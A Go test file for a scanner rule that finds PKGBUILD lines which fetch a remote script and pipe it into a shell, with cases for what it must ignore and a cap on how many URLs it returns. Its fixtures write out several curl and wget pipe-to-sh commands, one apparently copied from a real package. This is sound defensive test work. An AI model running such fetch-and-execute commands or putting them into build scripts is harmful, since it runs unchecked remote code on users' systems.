package rules

import "testing"

// Only the URLs already reported by DLE-001/DLE-002 are offered for retrieval —
// never a wider set. Fetching a URL nobody flagged would be contacting a host
// on the strength of nothing.
func TestRemoteExecURLs(t *testing.T) {
	cases := []struct {
		name  string
		files map[string]string
		want  []string
	}{
		{"curl pipe sh", map[string]string{
			"PKGBUILD": "pkgname=x\nbuild(){ curl -sfL https://example.org/i.sh | sh; }",
		}, []string{"https://example.org/i.sh"}},

		{"wget pipe bash with args", map[string]string{
			"PKGBUILD": "pkgname=x\nbuild(){ wget -qO- https://example.org/i.sh | bash -s -- --yes; }",
		}, []string{"https://example.org/i.sh"}},

		// 1panel-stable-bin, verbatim
		{"real world", map[string]string{
			"PKGBUILD": "pkgname=1panel\nbuild(){ curl -sfL https://resource.fit2cloud.com/installation-log.sh | sh -s 1p install; }",
		}, []string{"https://resource.fit2cloud.com/installation-log.sh"}},

		// A checksummed source is the whole difference; never fetch those.
		{"source array is not fetched", map[string]string{
			"PKGBUILD": "pkgname=x\nsource=(\"https://example.org/x.tar.gz\")\nsha256sums=('abc')",
		}, nil},

		{"download without executing", map[string]string{
			"PKGBUILD": "pkgname=x\nbuild(){ curl -sfL https://example.org/data.json -o data.json; }",
		}, nil},

		{"commented out", map[string]string{
			"PKGBUILD": "pkgname=x\n# curl -sfL https://example.org/i.sh | sh",
		}, nil},

		// A URL assembled from variables names no host we can resolve.
		{"variable url", map[string]string{
			"PKGBUILD": "pkgname=x\n_u=https://example.org\nbuild(){ curl -sfL $_u/i.sh | sh; }",
		}, nil},

		{"piped to sha256sum is not a shell", map[string]string{
			"PKGBUILD": "pkgname=x\nbuild(){ curl -sfL https://example.org/x.tar.gz | sha256sum; }",
		}, nil},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := RemoteExecURLs(c.files)
			if len(got) != len(c.want) {
				t.Fatalf("got %v, want %v", got, c.want)
			}
			for i := range got {
				if got[i] != c.want[i] {
					t.Errorf("got %q, want %q", got[i], c.want[i])
				}
			}
		})
	}
}

// A hostile PKGBUILD must not be able to turn the scanner into a request
// amplifier.
func TestRemoteExecURLsAreCapped(t *testing.T) {
	body := "pkgname=x\nbuild(){\n"
	for i := 0; i < 50; i++ {
		body += "  curl -sfL https://example.org/" + string(rune('a'+i%26)) + ".sh | sh\n"
	}
	body += "}\n"
	if n := len(RemoteExecURLs(map[string]string{"PKGBUILD": body})); n > maxRemoteURLs {
		t.Errorf("returned %d URLs, cap is %d", n, maxRemoteURLs)
	}
}
